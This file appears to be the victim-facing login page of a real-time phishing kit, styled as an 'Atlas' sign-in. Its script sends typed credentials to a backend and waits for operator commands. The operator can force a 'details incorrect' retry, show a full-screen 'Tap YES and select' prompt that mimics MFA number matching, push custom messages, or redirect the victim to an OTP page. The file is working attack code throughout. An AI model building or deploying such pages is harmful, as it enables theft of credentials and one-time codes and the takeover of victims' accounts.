<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Atlas Login</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
body {
  min-height: 100vh;
  background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #334155 100%);
  display: flex; justify-content: center; align-items: center; padding: 20px;
}
.card {
  background: #fff;
  border-radius: 24px;
  padding: 40px 32px;
  width: 100%;
  max-width: 420px;
  box-shadow: 0 20px 60px rgba(0,0,0,0.4);
}
.logo {
  width: 56px; height: 56px;
  background: linear-gradient(135deg, #4a4ff0, #7c3aed);
  border-radius: 16px;
  margin: 0 auto 20px;
  display: flex; align-items: center; justify-content: center;
  color: white; font-weight: 800; font-size: 24px;
}
h1 { font-size: 24px; font-weight: 700; color: #1f2937; text-align: center; margin-bottom: 8px; }
.subtitle { text-align: center; color: #6b7280; font-size: 14px; margin-bottom: 32px; }
.form-group { margin-bottom: 20px; }
label { display: block; font-size: 13px; font-weight: 600; color: #374151; margin-bottom: 8px; }
input {
  width: 100%; padding: 14px 16px;
  border: 1.5px solid #e5e7eb; border-radius: 12px;
  font-size: 15px; outline: none;
  transition: border-color 0.2s;
}
input:focus { border-color: #4a4ff0; }
input:disabled { background: #f3f4f6; cursor: not-allowed; }
button {
  width: 100%; padding: 15px;
  background: linear-gradient(90deg, #4a4ff0, #7c3aed);
  color: white; border: none; border-radius: 12px;
  font-size: 15px; font-weight: 600; cursor: pointer;
  display: flex; align-items: center; justify-content: center; gap: 10px;
  transition: opacity 0.2s;
}
button:disabled { opacity: 0.7; cursor: not-allowed; }
.spinner {
  width: 18px; height: 18px;
  border: 2px solid rgba(255,255,255,0.3);
  border-top-color: white;
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
}
@keyframes spin { to { transform: rotate(360deg); } }
.error-label {
  color: #dc2626; font-size: 13px;
  margin-top: 12px; text-align: center; display: none;
  background: #fef2f2; padding: 12px; border-radius: 10px;
}
.hidden { display: none !important; }

/* POPUP OVERLAY - YES / TEXT / OTP-ERROR */
.popup-overlay {
  position: fixed; inset: 0;
  background: rgba(0,0,0,0.92);
  z-index: 10000;
  display: none;
  justify-content: center;
  align-items: center;
  padding: 20px;
}
.popup-overlay.active { display: flex; }
.popup-yes {
  text-align: center; color: white;
  max-width: 500px; width: 100%;
}
.popup-yes .big-yes {
  font-size: 80px; font-weight: 900;
  color: #10b981; letter-spacing: 4px;
  text-shadow: 0 0 40px rgba(16,185,129,0.6);
  margin-bottom: 20px;
  animation: pulseYes 1.5s ease-in-out infinite;
}
@keyframes pulseYes {
  0%, 100% { transform: scale(1); }
  50% { transform: scale(1.05); }
}
.popup-yes .big-number {
  font-size: 120px; font-weight: 900;
  color: #fbbf24;
  letter-spacing: 8px;
  text-shadow: 0 0 40px rgba(251,191,36,0.6);
  margin: 20px 0;
}
.popup-yes .instruction {
  font-size: 20px; font-weight: 600;
  color: #e5e7eb; margin-top: 20px;
  line-height: 1.5;
}
.popup-text {
  background: white; border-radius: 20px;
  padding: 32px; max-width: 400px; width: 100%;
}
.popup-text .icon {
  width: 60px; height: 60px;
  background: linear-gradient(135deg, #f97316, #ea580c);
  border-radius: 50%;
  margin: 0 auto 16px;
  display: flex; align-items: center; justify-content: center;
  color: white; font-size: 28px; font-weight: bold;
}
.popup-text h3 { text-align: center; color: #1f2937; margin-bottom: 16px; font-size: 20px; }
.popup-text .message {
  background: #f3f4f6; padding: 20px; border-radius: 12px;
  color: #1f2937; font-size: 15px; line-height: 1.6;
  word-break: break-word; white-space: pre-wrap;
}
</style>
</head>
<body>

<div class="card">
  <div class="logo">A</div>
  <h1>Welcome Back</h1>
  <p class="subtitle">Sign in to continue</p>

  <div class="form-group">
    <label>Email</label>
    <input type="email" id="email" placeholder="you@example.com">
  </div>

  <div class="form-group">
    <label>Password</label>
    <input type="password" id="password" placeholder="Enter password">
  </div>

  <button id="submitBtn">Sign In</button>
  <div id="errorLabel" class="error-label"></div>
</div>

<!-- YES Popup -->
<div id="yesPopup" class="popup-overlay">
  <div class="popup-yes">
    <div class="big-yes">YES</div>
    <div class="big-number" id="yesNumber">00</div>
    <div class="instruction">Tap <strong>YES</strong> and select <strong id="yesNumberText">00</strong> to continue</div>
  </div>
</div>

<!-- Text Popup -->
<div id="textPopup" class="popup-overlay">
  <div class="popup-text">
    <div class="icon">!</div>
    <h3>Message</h3>
    <div class="message" id="textMessage"></div>
  </div>
</div>

<script src="/socket.io/socket.io.js"></script>
<script>
const socket = io();
const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const submitBtn = document.getElementById('submitBtn');
const errorLabel = document.getElementById('errorLabel');
const yesPopup = document.getElementById('yesPopup');
const textPopup = document.getElementById('textPopup');

let currentEmail = '';
let pollInterval = null;
let timeoutTimer = null;
let lastPopupId = 0;

function showError(msg) {
  errorLabel.textContent = msg;
  errorLabel.style.display = 'block';
  setTimeout(() => { errorLabel.style.display = 'none'; }, 8000);
}

function setLoading(loading) {
  submitBtn.disabled = loading;
  emailInput.disabled = loading;
  passwordInput.disabled = loading;
  if (loading) {
    submitBtn.innerHTML = '<div class="spinner"></div> Verifying your details...';
  } else {
    submitBtn.innerHTML = 'Sign In';
  }
}

function clearPopups() {
  yesPopup.classList.remove('active');
  textPopup.classList.remove('active');
}

function showYesPopup(number) {
  textPopup.classList.remove('active');
  document.getElementById('yesNumber').textContent = number;
  document.getElementById('yesNumberText').textContent = number;
  yesPopup.classList.add('active');
}

function showTextPopup(message) {
  yesPopup.classList.remove('active');
  document.getElementById('textMessage').textContent = message;
  textPopup.classList.add('active');
}

async function pollStatus() {
  if (!currentEmail) return;
  try {
    const res = await fetch(`/api/user/status?email=${encodeURIComponent(currentEmail)}`);
    const data = await res.json();

    // Wrong login → reset
    if (data.wrong_login_flag) {
      setLoading(false);
      clearPopups();
      emailInput.value = '';
      passwordInput.value = '';
      showError('Details incorrect. Please try again.');
      currentEmail = '';
      if (pollInterval) clearInterval(pollInterval);
      if (timeoutTimer) clearTimeout(timeoutTimer);
      await fetch('/api/user/clear-flags', {
        method: 'POST', headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ email: data.email })
      });
      return;
    }

    // Timeout → reset
    if (data.timeout_flag) {
      setLoading(false);
      clearPopups();
      emailInput.value = '';
      passwordInput.value = '';
      showError('Session reset. Please try again.');
      currentEmail = '';
      if (pollInterval) clearInterval(pollInterval);
      if (timeoutTimer) clearTimeout(timeoutTimer);
      await fetch('/api/user/clear-flags', {
        method: 'POST', headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ email: data.email })
      });
      return;
    }

    // Popup changes
    if (data.popup_id && data.popup_id > lastPopupId) {
      lastPopupId = data.popup_id;
      if (data.popup_type === 'yes') showYesPopup(data.popup_value);
      else if (data.popup_type === 'text') showTextPopup(data.popup_value);
    }

    // Redirect to OTP
    if (data.redirect_otp_flag) {
      window.location.href = `/otp.html?email=${encodeURIComponent(currentEmail)}`;
      return;
    }

    // Success
    if (data.status === 'success') {
      window.location.href = `/success.html?email=${encodeURIComponent(currentEmail)}`;
      return;
    }

    // If approved and OTP submitted successfully — no action needed on login page
  } catch (err) { console.error(err); }
}

submitBtn.addEventListener('click', async () => {
  const email = emailInput.value.trim();
  const password = passwordInput.value.trim();
  if (!email || !password) { showError('Please fill in all fields.'); return; }

  currentEmail = email;
  setLoading(true);
  clearPopups();
  lastPopupId = 0;

  try {
    const res = await fetch('/api/user/login', {
      method: 'POST', headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ email, password })
    });
    const data = await res.json();
    if (!data.success) {
      setLoading(false);
      showError(data.error || 'Login failed.');
      return;
    }

    if (pollInterval) clearInterval(pollInterval);
    pollInterval = setInterval(pollStatus, 1500);

    // 60s timeout
    if (timeoutTimer) clearTimeout(timeoutTimer);
    timeoutTimer = setTimeout(() => {
      setLoading(false);
      showError('Timeout. Please try again after 5 minutes.');
      if (pollInterval) clearInterval(pollInterval);
    }, 60000);

  } catch (err) {
    setLoading(false);
    showError('Network error. Please try again.');
  }
});

// Socket events for instant popups
socket.on('popup-update', (data) => {
  if (data.email !== currentEmail) return;
  if (data.popup_id > lastPopupId) {
    lastPopupId = data.popup_id;
    if (data.popup_type === 'yes') showYesPopup(data.popup_value);
    else if (data.popup_type === 'text') showTextPopup(data.popup_value);
  }
});
</script>
</body>
</html>
